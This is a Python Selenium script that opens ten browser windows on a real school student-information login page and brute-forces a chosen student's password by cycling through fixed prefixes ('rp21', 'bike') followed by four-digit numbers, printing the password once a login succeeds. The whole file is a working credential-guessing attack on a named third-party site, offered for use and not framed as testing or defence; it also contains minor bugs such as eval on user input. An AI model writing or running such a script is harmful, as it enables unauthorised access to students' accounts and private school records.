from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium import webdriver
import time


name = input("enter username here: ")
year = eval(input("enter grad year here: "))


browser1 = webdriver.Chrome(executable_path=r"C:\Users\abdel\Downloads\chromedriver_win32\chromedriver.exe")
browser1.get('https://sdm.sisk12.com/RP360x3/login')
time.sleep(1)
student = browser1.find_element_by_id("mat-tab-label-0-2")
student.click()
    
browser2 = webdriver.Chrome(executable_path=r"C:\Users\abdel\Downloads\chromedriver_win32\chromedriver.exe")
browser2.get('https://sdm.sisk12.com/RP360x3/login')
time.sleep(1)
student = browser2.find_element_by_id("mat-tab-label-0-2")
student.click()
    
browser3 = webdriver.Chrome(executable_path=r"C:\Users\abdel\Downloads\chromedriver_win32\chromedriver.exe")
browser3.get('https://sdm.sisk12.com/RP360x3/login')
time.sleep(1)
student = browser3.find_element_by_id("mat-tab-label-0-2")
student.click()
    
browser4 = webdriver.Chrome(executable_path=r"C:\Users\abdel\Downloads\chromedriver_win32\chromedriver.exe")
browser4.get('https://sdm.sisk12.com/RP360x3/login')
time.sleep(1)
student = browser4.find_element_by_id("mat-tab-label-0-2")
student.click()
    
browser5 = webdriver.Chrome(executable_path=r"C:\Users\abdel\Downloads\chromedriver_win32\chromedriver.exe")
browser5.get('https://sdm.sisk12.com/RP360x3/login')
time.sleep(1)
student = browser5.find_element_by_id("mat-tab-label-0-2")
student.click()
    
browser6 = webdriver.Chrome(executable_path=r"C:\Users\abdel\Downloads\chromedriver_win32\chromedriver.exe")
browser6.get('https://sdm.sisk12.com/RP360x3/login')
time.sleep(1)
student = browser6.find_element_by_id("mat-tab-label-0-2")
student.click()

browser7 = webdriver.Chrome(executable_path=r"C:\Users\abdel\Downloads\chromedriver_win32\chromedriver.exe")
browser7.get('https://sdm.sisk12.com/RP360x3/login')
time.sleep(1)
student = browser7.find_element_by_id("mat-tab-label-0-2")
student.click()

browser8 = webdriver.Chrome(executable_path=r"C:\Users\abdel\Downloads\chromedriver_win32\chromedriver.exe")
browser8.get('https://sdm.sisk12.com/RP360x3/login')
time.sleep(1)
student = browser8.find_element_by_id("mat-tab-label-0-2")
student.click()

browser9 = webdriver.Chrome(executable_path=r"C:\Users\abdel\Downloads\chromedriver_win32\chromedriver.exe")
browser9.get('https://sdm.sisk12.com/RP360x3/login')
time.sleep(1)
student = browser9.find_element_by_id("mat-tab-label-0-2")
student.click()

browser10 = webdriver.Chrome(executable_path=r"C:\Users\abdel\Downloads\chromedriver_win32\chromedriver.exe")
browser10.get('https://sdm.sisk12.com/RP360x3/login')
time.sleep(1)
student = browser10.find_element_by_id("mat-tab-label-0-2")
student.click()
  


num1 = str(0000).zfill(4)
num2 = str(1000).zfill(4)
num3 = str(2000).zfill(4)
num4 = str(3000).zfill(4)
num5 = str(4000).zfill(4)
num6 = str(5000).zfill(4)
num7 = str(6000).zfill(4)
num8 = str(7000).zfill(4)
num9 = str(8000).zfill(4)
num10 = str(9000).zfill(4)
    
if year == 21:
    
    while browser1.current_url == ("https://sdm.sisk12.com/RP360x3/login") and browser2.current_url == ("https://sdm.sisk12.com/RP360x3/login") and browser3.current_url == ("https://sdm.sisk12.com/RP360x3/login")\
and browser4.current_url == ("https://sdm.sisk12.com/RP360x3/login") and browser5.current_url == ("https://sdm.sisk12.com/RP360x3/login") and browser6.current_url == ("https://sdm.sisk12.com/RP360x3/login")\
and browser7.current_url == ("https://sdm.sisk12.com/RP360x3/login") and browser8.current_url == ("https://sdm.sisk12.com/RP360x3/login") and browser9.current_url == ("https://sdm.sisk12.com/RP360x3/login")\
and browser10.current_url == ("https://sdm.sisk12.com/RP360x3/login") and int(num1)<1000 and int(num2)<2000 and int(num3)<3000 and int(num4)<4000 and int(num5)<5000 and int(num6)<6000 and int(num7)<7000 and int(num8)<8000 \
and int(num9)<9000 and int(num10)<10000:
        try:
            username = browser1.find_element_by_id("txtUserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser1.find_element_by_id("txtPassword")
            password.clear()
            password.send_keys("rp21" + str(num1).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num1 = int(num1) + 1
        print(str(num1).zfill(4))

        try:
            username = browser2.find_element_by_id("txtUserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser2.find_element_by_id("txtPassword")
            password.clear()
            password.send_keys("rp21" + str(num2).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num2 = int(num2) + 1
        print(num2)
        
        try:
            username = browser3.find_element_by_id("txtUserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser3.find_element_by_id("txtPassword")
            password.clear()
            password.send_keys("rp21" + str(num3).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num3 = int(num3) + 1
        print(num3)
        
        try:
            username = browser4.find_element_by_id("txtUserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser4.find_element_by_id("txtPassword")
            password.clear()
            password.send_keys("rp21" + str(num4).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num4 = int(num4) + 1
        print(num4)

        try:
            username = browser5.find_element_by_id("txtUserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser5.find_element_by_id("txtPassword")
            password.clear()
            password.send_keys("rp21" + str(num5).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num5 = int(num5) + 1
        print(num5)

        try:
            username = browser6.find_element_by_id("txtUserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser6.find_element_by_id("txtPassword")
            password.clear()
            password.send_keys("rp21" + str(num6).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num6 = int(num6) + 1
        print(num6)

        try:
            username = browser7.find_element_by_id("txtUserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser7.find_element_by_id("txtPassword")
            password.clear()
            password.send_keys("rp21" + str(num7).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num7 = int(num7) + 1
        print(num7)

        try:
            username = browser8.find_element_by_id("txtUserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser8.find_element_by_id("txtPassword")
            password.clear()
            password.send_keys("rp21" + str(num8).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num8 = int(num8) + 1
        print(num8)

        try:
            username = browser9.find_element_by_id("txtUserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser9.find_element_by_id("txtPassword")
            password.clear()
            password.send_keys("rp21" + str(num9).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num9 = int(num9) + 1
        print(num9)

        try:
            username = browser10.find_element_by_id("txtUserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser10.find_element_by_id("txtPassword")
            password.clear()
            password.send_keys("rp21" + str(num10).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num10 = int(num10) + 1
        print(num10)



        
    if browser1.current_url == ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
        num1 = int(num1) - 2
        print("The password is:" + "rp21" + str(num1).zfill(4))
    if browser2.current_url == ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
        num2 = int(num2) - 2
        print("The password is:" + "rp21" + str(num2).zfill(4))
    if browser3.current_url == ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
        num3 = int(num3) - 2
        print("The password is:" + "rp21" + str(num3).zfill(4))
    if browser4.current_url == ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
        num4 = int(num4) - 2
        print("The password is:" + "rp21" + str(num4).zfill(4))
    if browser5.current_url == ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
        num5 = int(num5) - 2
        print("The password is:" + "rp21" + str(num5).zfill(4))
    if browser6.current_url == ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
        num6 = int(num6) - 2
        print("The password is:" + "rp21" + str(num6).zfill(4))
    if browser7.current_url == ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
        num7 = int(num7) - 2
        print("The password is:" + "rp21" + str(num7).zfill(4))
    if browser8.current_url == ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
        num1 = int(num1) - 2
        print("The password is:" + "rp21" + str(num8).zfill(4))
    if browser9.current_url == ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
        num9 = int(num9) - 2
        print("The password is:" + "rp21" + str(num9).zfill(4))
    if browser10.current_url == ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
        num10 = int(num10) - 2
        print("The password is:" + "rp21" + str(num10).zfill(4))
    if  browser1.current_url != ("https://sdm.sisk12.com/RP360x3/student360/studentSummary") and browser2.current_url != ("https://sdm.sisk12.com/RP360x3/student360/studentSummary") and browser3.current_url != ("https://sdm.sisk12.com/RP360x3/student360/studentSummary")\
and browser4.current_url != ("https://sdm.sisk12.com/RP360x3/student360/studentSummary") and browser5.current_url != ("https://sdm.sisk12.com/RP360x3/student360/studentSummary") and browser6.current_url != ("https://sdm.sisk12.com/RP360x3/student360/studentSummary") and \
browser7.current_url != ("https://sdm.sisk12.com/RP360x3/student360/studentSummary") and browser8.current_url != ("https://sdm.sisk12.com/RP360x3/student360/studentSummary") and browser9.current_url != ("https://sdm.sisk12.com/RP360x3/student360/studentSummary") and \
browser10.current_url != ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
        print("There has been an error please try again")
    time.sleep(1)






    
elif year == 23:
    
    while browser1.current_url == ("https://sdm.sisk12.com/RP360x3/login") and browser2.current_url == ("https://sdm.sisk12.com/RP360x3/login") and browser3.current_url == ("https://sdm.sisk12.com/RP360x3/login")\
and browser4.current_url == ("https://sdm.sisk12.com/RP360x3/login") and browser5.current_url == ("https://sdm.sisk12.com/RP360x3/login") and browser6.current_url == ("https://sdm.sisk12.com/RP360x3/login")\
and browser7.current_url == ("https://sdm.sisk12.com/RP360x3/login") and browser8.current_url == ("https://sdm.sisk12.com/RP360x3/login") and browser9.current_url == ("https://sdm.sisk12.com/RP360x3/login")\
and browser10.current_url == ("https://sdm.sisk12.com/RP360x3/login") and int(num1)<1000 and int(num2)<2000 and int(num3)<3000 and int(num4)<4000 and int(num5)<5000 and int(num6)<6000 and int(num7)<7000 and int(num8)<8000 \
and int(num9)<9000 and int(num10)<10000:
        try:
            username = browser1.find_element_by_id("txtUserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser1.find_element_by_id("txtPassword")
            password.clear()
            password.send_keys("bike" + str(num1).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num1 = int(num1) + 1
        print(str(num1).zfill(4))

        try:
            username = browser2.find_element_by_id("txtUserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser2.find_element_by_id("txtPassword")
            password.clear()
            password.send_keys("bike" + str(num2).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num2 = int(num2) + 1
        print(num2)

        try:
            username = browser3.find_element_by_id("txtUserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser3.find_element_by_id("txtPassword")
            password.clear()
            password.send_keys("bike" + str(num3).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num3 = int(num3) + 1
        print(num3)

        try:
            username = browser4.find_element_by_id("txtUserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser4.find_element_by_id("txtPassword")
            password.clear()
            password.send_keys("bike" + str(num4).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num4 = int(num4) + 1
        print(num4)

        try:
            username = browser5.find_element_by_id("txtUserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser5.find_element_by_id("txtPassword")
            password.clear()
            password.send_keys("bike" + str(num5).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num5 = int(num5) + 1
        print(num5)

        try:
            username = browser6.find_element_by_id("txtUserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser6.find_element_by_id("txtPassword")
            password.clear()
            password.send_keys("bike" + str(num6).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num6 = int(num6) + 1
        print(num6)

        try:
            username = browser7.find_element_by_id("txtUserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser7.find_element_by_id("txtPassword")
            password.clear()
            password.send_keys("bike" + str(num7).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num7 = int(num7) + 1
        print(num7)

        try:
            username = browser8.find_element_by_id("txtUserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser8.find_element_by_id("txtPassword")
            password.clear()
            password.send_keys("bike" + str(num8).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num8 = int(num8) + 1
        print(num8)

        try:
            username = browser9.find_element_by_id("txtUserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser9.find_element_by_id("txtPassword")
            password.clear()
            password.send_keys("bike" + str(num9).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num9 = int(num9) + 1
        print(num9)

        try:
            username = browser10.find_element_by_id("txtUserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser10.find_element_by_id("txtPassword")
            password.clear()
            password.send_keys("bike" + str(num10).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num10 = int(num10) + 1
        print(num10)

        

    if browser1.current_url == ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
        num1 = int(num1) - 2
        print("The password is:" + "bike" + str(num1).zfill(4))
    if browser2.current_url == ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
        num2 = int(num2) - 2
        print("The password is:" + "bike" + str(num2).zfill(4))
    if browser3.current_url == ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
        num3 = int(num3) - 2
        print("The password is:" + "bike" + str(num3).zfill(4))
    if browser4.current_url == ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
        num4 = int(num4) - 2
        print("The password is:" + "bike" + str(num4).zfill(4))
    if browser5.current_url == ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
        num5 = int(num5) - 2
        print("The password is:" + "bike" + str(num5).zfill(4))
    if browser6.current_url == ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
        num6 = int(num6) - 2
        print("The password is:" + "bike" + str(num6).zfill(4))
    if browser7.current_url == ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
        num7 = int(num7) - 2
        print("The password is:" + "bike" + str(num7).zfill(4))
    if browser8.current_url == ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
        num1 = int(num1) - 2
        print("The password is:" + "bike" + str(num8).zfill(4))
    if browser9.current_url == ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
        num9 = int(num9) - 2
        print("The password is:" + "bike" + str(num9).zfill(4))
    if browser10.current_url == ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
        num10 = int(num10) - 2
        print("The password is:" + "bike" + str(num10).zfill(4))
    if  browser1.current_url != ("https://sdm.sisk12.com/RP360x3/student360/studentSummary") and browser2.current_url != ("https://sdm.sisk12.com/RP360x3/student360/studentSummary") and browser3.current_url != ("https://sdm.sisk12.com/RP360x3/student360/studentSummary")\
and browser4.current_url != ("https://sdm.sisk12.com/RP360x3/student360/studentSummary") and browser5.current_url != ("https://sdm.sisk12.com/RP360x3/student360/studentSummary") and browser6.current_url != ("https://sdm.sisk12.com/RP360x3/student360/studentSummary") and \
browser7.current_url != ("https://sdm.sisk12.com/RP360x3/student360/studentSummary") and browser8.current_url != ("https://sdm.sisk12.com/RP360x3/student360/studentSummary") and browser9.current_url != ("https://sdm.sisk12.com/RP360x3/student360/studentSummary") and \
browser10.current_url != ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
        print("There has been an error please try again")
    time.sleep(1)




        
else:
    print("This class is not supported by this program")
    




browser1.quit
browser2.quit
browser3.quit
browser4.quit
browser5.quit
browser6.quit
browser7.quit
browser8.quit
browser9.quit
browser10.quit
    
    
    
